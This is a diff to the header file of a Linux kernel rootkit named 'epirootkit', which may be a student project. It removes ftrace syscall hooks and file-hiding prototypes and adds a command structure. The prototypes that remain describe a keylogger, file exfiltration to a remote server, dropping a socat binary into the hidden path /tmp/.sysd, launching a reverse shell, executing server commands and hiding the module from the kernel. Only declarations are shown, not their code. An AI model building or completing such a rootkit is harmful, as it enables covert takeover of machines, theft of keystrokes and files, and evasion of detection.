@@ -1,27 +1,21 @@
 #ifndef EPIROOTKIT_H
 #define EPIROOTKIT_H
 
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/errno.h>
+#include <linux/fs.h>
 #include <linux/ftrace.h>
-#include <linux/module.h>
-#include <linux/types.h>
 #include <linux/kallsyms.h>
+#include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/module.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 #include <linux/uaccess.h>
 
 // Utils macros
 #define SUCCESS 0
 #define FAILURE 1
 #define SHA256_DIGEST_SIZE 32
-#define SYSCALL_NAME(name) ("__x64_" name)
-#define HOOK(_name, _hook, _orig) {							\
-        .name = SYSCALL_NAME(_name),                        \
-        .function = (_hook),                                \
-        .original = (_orig),                               	\
-    }
 
 // Logs macros
 #define DEBUG 1
@@ -31,6 +25,7 @@
 			pr_info(fmt, ##args); 							\
 		} 													\
 	} while (0)
+
 #define ERR_MSG(fmt, args...) 								\
 	do { 													\
 		if (DEBUG) { 										\
@@ -60,15 +55,13 @@ struct exec_code_stds {
 	char *std_err;
 };
 
-// Hooks and Ftrace parameters
-struct ftrace_hook{
-    const char *name;       								// Name of the target symbol
-    void *function;         								// Address of the hook function
-    void *original;        									// Pointer to storage for the original address
-    unsigned long address; 	 								// Resolved address of the target symbol
-    struct ftrace_ops ops;
+struct command {
+    char *cmd_name;
+    unsigned cmd_name_size;
+    char *cmd_desc;
+    unsigned cmd_desc_size;
+    int (*cmd_handler)(char *args);
 };
-
 
 // Module parameters
 extern char *ip;
@@ -82,8 +75,6 @@ extern struct socket *sock;									// Socket for network communication
 extern struct exec_code_stds exec_result;					// Last execution result
 extern struct task_struct *network_thread;					// Thread for network communication
 extern bool thread_exited;									// Flag to indicate if the thread has exited
-extern size_t hook_array_size;								// Size of the hook array
-extern struct ftrace_hook hooks[];							// Array of hooks for syscall table
 
 // Function prototypes
 
@@ -103,7 +94,7 @@ void hash_to_str(const u8 *digest, char *output);			// Convert a hash to a strin
 
 // network.c
 int send_to_server(char *message, ...);						// Send a message to the server
-int receive_from_server(char *recv_buffer, int buffer_size); // Wait for a message from the server
+int receive_from_server(char *recv_buffer, int buffer_size);// Wait for a message from the server
 int send_file_to_server(char *filename);					// Send a file to the server
 int network_worker(void *data);								// Kernel thread for network communication
 int close_socket(void);										// Release the socket
@@ -119,26 +110,10 @@ int epikeylog_exit(void);									// Cleanup function for the keylogger
 // socat.c
 int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
 int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
-int launch_reverse_shell(char *args);								// Launch the reverse shell with socat
+int launch_reverse_shell(char *args);						// Launch the reverse shell with socat
 
 // rootkit_command.c
 int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
-
-// ftrace.c
-extern int fh_install_hooks
-	(struct ftrace_hook *hooks, size_t count);				// Install hooks in the syscall table
-extern void fh_remove_hooks
-	(struct ftrace_hook *hooks, size_t count);				// Remove hooks from the syscall table
-
-// hooks.c
-int add_hidden_dir(const char *dirname);					// Add a directory to the hidden list
-int remove_hidden_dir(const char *dirname);				    // Remove a directory from the hidden list
-int is_hidden(const char *name); 							// Check if a directory is hidden
-int list_hidden_dirs(char *buf, size_t buf_size); 			// List hidden directories
-int add_modified_file(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst);
-int remove_modified_file(const char *path);
-int list_modified_files(char *buf, size_t size);
-
 
 // hider.c
 int hide_module(void);										// Hide the module from the kernel
